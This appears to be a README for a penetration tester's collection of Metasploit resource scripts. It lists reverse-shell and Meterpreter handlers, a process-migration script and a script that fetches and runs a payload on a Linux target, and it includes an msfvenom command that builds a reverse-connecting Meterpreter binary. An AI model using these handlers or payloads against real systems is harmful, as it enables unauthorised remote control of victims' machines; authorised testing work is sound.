# msf_scripts

Metasploit resource scripts. Run one with `msfconsole -r <file>`, or generate an
equivalent handler on the fly with `msfhandler` (`msfhandler.py` in this directory),
which takes LHOST/LPORT/arch/OS/protocol as arguments instead of needing a file per
combination.

## Handlers

| File                          | Payload                                 |
| ----------------------------- | --------------------------------------- |
| `meterpreter_nix_x64_tcp.rc`  | `linux/x64/meterpreter/reverse_tcp`     |
| `meterpreter_nix_x86_tcp.rc`  | `linux/meterpreter/reverse_tcp`         |
| `meterpreter_win_x64_tcp.rc`  | `windows/x64/meterpreter/reverse_tcp`   |
| `meterpreter_win_x64_http.rc` | `windows/x64/meterpreter/reverse_https` |
| `meterpreter_win_x86_tcp.rc`  | `windows/meterpreter/reverse_tcp`       |
| `meterpreter_win_x86_http.rc` | `windows/meterpreter/reverse_https`     |
| `shell_win_x64_tcp.rc`        | `windows/x64/shell/reverse_tcp`         |
| `shell_win_x86_tcp.rc`        | `windows/shell/reverse_tcp`             |

All bind `LHOST tun0` / `LPORT 443`. There used to be a parallel `_tun0` set of these,
byte-identical to the files above because the "non-tun0" ones already set `LHOST tun0`;
the suffix meant nothing and the duplicates are gone.

## Follow-on scripts

- `auto_migrate_met.rc` — `migrate -N explorer.exe`. Set as `autorunscript` on the
  **Windows** x86 handlers. Not wired into the Linux ones: explorer.exe does not exist
  there.
- `stage_met_linux.rc` — fetches a meterpreter ELF over HTTP and runs it, for upgrading
  a plain shell on a Linux target.

## The ELF is not committed

`stage_met_linux.rc` used to fetch a `met.elf` checked into this directory, from a
hardcoded address that has long since gone stale. Both are gone: the binary is rebuilt
per engagement so `LHOST` actually points at your current attack address, and a live
payload does not belong in a public repository.

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$A_IP LPORT=443 -f elf -o met.elf
```

`$A_IP` comes from `attack` — run `attack tun0` first.
